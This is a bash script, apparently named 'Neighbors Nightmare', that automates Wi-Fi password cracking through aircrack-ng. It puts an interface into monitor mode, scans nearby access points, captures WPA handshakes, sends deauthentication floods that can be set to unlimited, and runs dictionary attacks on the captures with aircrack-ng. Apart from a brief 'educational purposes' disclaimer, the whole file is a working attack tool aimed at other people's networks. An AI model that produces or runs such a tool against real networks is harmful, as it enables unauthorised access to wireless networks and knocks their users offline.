#!/bin/bash

###############  --  CONFIGURATION  --  ##################
default_interface="wlan0"
terminal_cmd="gnome-terminal --" # Change to your desktop environment supported terminal
capdir="${HOME}/airocap"         # Directory to save .cap files
#conf_wordlist="/root/wordlist"
###############  --  CONFIG END     --  ##################
###############  --  COLORS         --  ##################
NORMAL=$(tput sgr0)
BLUE=$(tput setaf 4)
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
BOLD=$(tput bold)
ITALIC=$(tput sitm)
###############  --  COLORS END     --  ##################

mkdir -p ${capdir}

usage() {
    echo "Usage: ${0} [-m <1-4>]" 1>&2
    exit 1
}

echo "${RED}
███╗   ██╗███████╗██╗ ██████╗ ██╗  ██╗██████╗  ██████╗ ██████╗ ███████╗
████╗  ██║██╔════╝██║██╔════╝ ██║  ██║██╔══██╗██╔═══██╗██╔══██╗██╔════╝
██╔██╗ ██║█████╗  ██║██║  ███╗███████║██████╔╝██║   ██║██████╔╝███████╗
██║╚██╗██║██╔══╝  ██║██║   ██║██╔══██║██╔══██╗██║   ██║██╔══██╗╚════██║
██║ ╚████║███████╗██║╚██████╔╝██║  ██║██████╔╝╚██████╔╝██║  ██║███████║
╚═╝  ╚═══╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝

███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███╗   ███╗ █████╗ ██████╗ ███████╗
████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝████╗ ████║██╔══██╗██╔══██╗██╔════╝
██╔██╗ ██║██║██║  ███╗███████║   ██║   ██╔████╔██║███████║██████╔╝█████╗
██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██║╚██╔╝██║██╔══██║██╔══██╗██╔══╝
██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║██║  ██║██║  ██║███████╗
╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝${NORMAL}
${BOLD}Wifi craking tool  -  made in front of aircrack-ng${NORMAL}

${BOLD}${RED}DISCLAIMER:${NORMAL} This tool is for EDUCATIONAL PORPOSES ONLY.
Don't use it for illegal activities. You are the only responsable of your actions!
"

if [ "${EUID}" -ne 0 ]; then
    echo -e "${BOLD}${RED}Please run it as root${NORMAL}"
    exit
fi

if [ ! -z $(/usr/sbin/iwconfig 2>/dev/null | grep "Mode:Monitor" | cut -d" " -f1) ]; then
    echo -e "${ITALIC}${GREEN}Monitor mode enabled !${NORMAL}"
else
    echo -e "${ITALIC}${RED}Monitor mode disabled !${NORMAL}"
fi

function main_menu {
    if [ -z "${1}" ]; then
        echo -e "
${BOLD}${BLUE}1)${NORMAL} Scan networks
${BOLD}${BLUE}2)${NORMAL} Try to crack wifi password
${BOLD}${BLUE}3)${NORMAL} Enable monitor mode
${BOLD}${BLUE}4)${NORMAL} Disable monitor mode
${BOLD}${BLUE}X)${NORMAL} Exit script\n"

    fi

    if [ -z ${mode} ]; then
        echo -n "${BOLD}Choice : ${NORMAL}"

        read choice
    else
        choice=${mode}
    fi

    # in most of case, wlan0mon
    local imon=$(/usr/sbin/iwconfig 2>/dev/null | grep "Mode:Monitor" | cut -d" " -f1)

    # save cap files in /tmp
    tmpDir="/tmp/airocap"
    mkdir -p ${tmpDir}
    rm -f ${tmpDir}/*

    case ${choice} in
    1)
        scan_net
        ;;
    2)
        crack_menu
        ;;
    3) #airmon-ng check kill && airmon-ng start wlan0
        ip link set ${default_interface} down && airmon-ng start ${default_interface}
        echo -e "${ITALIC}${BLUE}Monitor mode activated.${NORMAL}"
        [ -z ${mode} ] && main_menu || exit 1
        ;;
    4)
        airmon-ng stop ${imon} && service NetworkManager start
        echo -e "${ITALIC}${BLUE}Monitor mode disabled for ${imon}.${NORMAL}"
        [ -z ${mode} ] && main_menu || exit 1
        ;;
    X | x)
        echo "Bye !" && exit 1
        ;;
    *)
        echo -e "${BOLD}${RED}Invalid choice${NORMAL}"
        [ -n ${mode} ] && usage
        [ -z ${mode} ] && main_menu false || exit 1
        ;;
    esac
}

scan_net() {
    if [ -z ${imon} ]; then
        echo -e "${BOLD}${RED}You don't have any monitor interfaces. Please enable monitor mode first (3)${NORMAL}"
        [ -z ${mode} ] && main_menu || exit 1
    fi
    airodump-ng ${imon} -w ${tmpDir}/res
    clear -x
    cat ${tmpDir}/res-01.csv | awk -F',' 'BEGIN {
     i=0
     mode=1
     line=0
     start=1
   }
   {
     if ($1 == "BSSID")
     {
       mode=1
       print "==> Access points"
     }
     else if ($1 == "Station MAC")
     {
       mode=2
       print "==> Devices"
     }
     else if ((mode == 1) && (length($1) == 17))
     {
        if (start == 1) {
            printf "%c[1;100m %3s)%-32s, %-6s,    %2s,   %10s,   %-17s%c[0m\n", 27, "id", " SSID", " Power", "CH", "Cipher", "Mac", 27
            start=0
        }
        if (line == 1)
        {
         printf " %3d)%-32s, %-4sdB,   %2s,   %10s,   %s\n", i, $14, $9, $4, $6, $1
         i++
         line=0
        }
        else if (line == 0)
        {
         printf "%c[1;40;30m %3d)%-32s, %-4sdB,   %2s,   %10s,   %s%c[0m\n", 27, i, $14, $9, $4, $6, $1, 27
         i++
         line=1
        }
     }
    }' | grep -v "^==>" >${tmpDir}/menu1

    # Print net list
    cat ${tmpDir}/menu1

    prompt_net() {
        echo -n $'\n' "Input selected network id [R to rescan]: "
        read apnum
        if [ -z ${apnum} ]; then
            echo -e "${BOLD}${RED}You must input a number.${NORMAL}"
            prompt_net
        elif [ ${apnum} == "R" ] || [ ${apnum} == "r" ]; then
            mode=1 && main_menu false # back to main menu, directly in the scan option
        elif [ ! -z "${apnum##[0-9]*}" ] || ((${apnum} < 0)); then
            echo -e "${BOLD}${RED}Network id must be a number.${NORMAL}"
            prompt_net
        fi
    }
    prompt_net

    apline=$(cat ${tmpDir}/menu1 | grep -E "\b${apnum}\)")
    apmac=$(echo ${apline} | grep -oE "([0-9a-fA-F]{2}:?){6}")
    apchannel=$(echo ${apline} | cut -d"," -f3 | grep -o "[1-9]*")
    apnameline=${apline#*)}
    apname=$(echo ${apnameline%,*,*,*,*} | sed 's/ *$//g')
    apnamesec=$(echo ${apname} | tr '-' '_' | tr ' ' '_')

    echo -e "
    Selected network ${BOLD}${BLUE}${apname}${NORMAL} with mac address ${BOLD}${BLUE}${apmac}${NORMAL} on channel ${BOLD}${BLUE}${apchannel}${NORMAL}."
    attack_mode_menu
}

attack_mode_menu() {
    [ ! -z "${2}" ] && clear -x
    if [ -z "${1}" ] || [ "${1}" == "crack" ]; then
        [ "${1}" == "crack" ] && echo -ne "${BOLD}${BLUE}C)${NORMAL} Try to crack this network (if WPA handshake received)"
        echo -e "
${BOLD}${BLUE}R)${NORMAL} Re-scan
${BOLD}${BLUE}1)${NORMAL} Capture handshakes
${BOLD}${BLUE}2)${NORMAL} Deauthentify this network
${BOLD}${BLUE}3)${NORMAL} Capture handshakes & Deauthentify this network
${BOLD}${BLUE}B)${NORMAL} Back to main menu
${BOLD}${BLUE}X)${NORMAL} Exit script"
    fi

    echo -ne $'\n' "${BOLD}Choice :${NORMAL} "

    read attackmode
    case ${attackmode} in
    C | c)
        mode=2 && main_menu false
        ;;
    R | r)
        mode=1 && main_menu false
        ;;
    1)
        capsave="${capdir}/${apnamesec}-[${apmac}]/"
        mkdir -p ${capsave}
        rm -f ${capsave}/*
        airodump-ng --bssid ${apmac} -c ${apchannel} -w "${capsave}/out" ${imon}
        attack_mode_menu "crack"
        ;;
    2)
        echo -n "Number of deauthentification requests you want to send (0 for unlimited) [default 10]: "
        read deauthnbr
        if [ -z ${deauthnbr} ] || [ ! -z "${deauthnbr##[0-9]*}" ] || ((${deauthnbr} < 0)) 2>/dev/null; then
            echo -e "${BOLD}${RED}Invalid choice, using 10.${NORMAL}"
            deauthnbr=10
        fi
        iwconfig ${imon} channel ${apchannel}
        aireplay-ng -0 ${deauthnbr} -a ${apmac} ${imon}
        attack_mode_menu
        ;;
    3)
        clear -x
        echo -e "${BOLD}${RED}NOTE:${NORMAL} \e[3mTo stop deauth, simply Ctrl+C in the popup terminal window.${NORMAL}"
        echo -n "Number of deauthentification requests you want to send (0 for unlimited) [default 10]: "
        read deauthnbr
        if [ -z ${deauthnbr} ] || [ ! -z "${deauthnbr##[0-9]*}" ] || ((${deauthnbr} < 0)) 2>/dev/null; then
            echo -e "${BOLD}${RED}Invalid choice, using 10.${NORMAL}"
            deauthnbr=10
        fi
        capsave="${capdir}/${apnamesec}-[${apmac}]/"
        mkdir -p ${capsave}
        rm -f ${capsave}/*
        iwconfig ${imon} channel ${apchannel}
        ${terminal_cmd} sh -c "aireplay-ng -0 ${deauthnbr} -a ${apmac} ${imon}"
        airodump-ng --bssid ${apmac} -c ${apchannel} -w "${capsave}/out" ${imon}
        attack_mode_menu "crack"
        ;;
    B | b)
        main_menu
        ;;
    X | x)
        echo "Bye !" && exit 1
        ;;
    *)
        echo -e "${BOLD}${RED}Invalid choice${NORMAL}" && attack_mode_menu false
        ;;

    esac
}

crack_menu() {
    [[ -z ${1} ]] && clear -x && echo -e "${BOLD}List of captured networks:${NORMAL}"
    i=0
    capdirlist=($(ls -t ${capdir})) # | tr ' ' '\n'
    for dir in "${capdirlist[@]}"; do
        if [ -z ${1} ]; then
            echo -ne '\n' "${BOLD}${BLUE}${i})${NORMAL} ${dir}"
            [[ ${i} -eq 0 ]] && echo -ne "         ${ITALIC}${BLUE}recent${NORMAL}"
        fi
        ((++i))
    done
    [[ -z ${1} ]] && echo -e '\n'
    echo -ne "${BOLD}ID of the network you want to crack : ${NORMAL}"
    read macchoice
    if [ -z ${macchoice} ] || ((${macchoice} >= ${i})); then
        echo -e "${BOLD}${RED}Invalid choice${NORMAL}" && crack_menu false
    fi

    selap=${capdirlist[@]:$macchoice:1}
    echo "Selected AP: ${selap}"
    wordlist=${conf_wordlist:=$(zenity --file-selection --title="Select a wordlist" --file-filter="*.txt *.lst")}
    echo "Using wordlist ${wordlist}"
    sleep 2
    aircrack-ng "${capdir}/${selap}/out-01.cap" -w "${wordlist}"
}

# Parse flags
while getopts ":m:" option; do
    case "${option}" in
    m)
        mode=${OPTARG}
        ((mode < 1 || mode > 4)) || return usage
        ;;
    *)
        usage
        ;;
    esac
done

# Allow to use $1
shift $((OPTIND - 1))

if [ ! -z "${mode}" ]; then
    main_menu false
else
    main_menu
fi
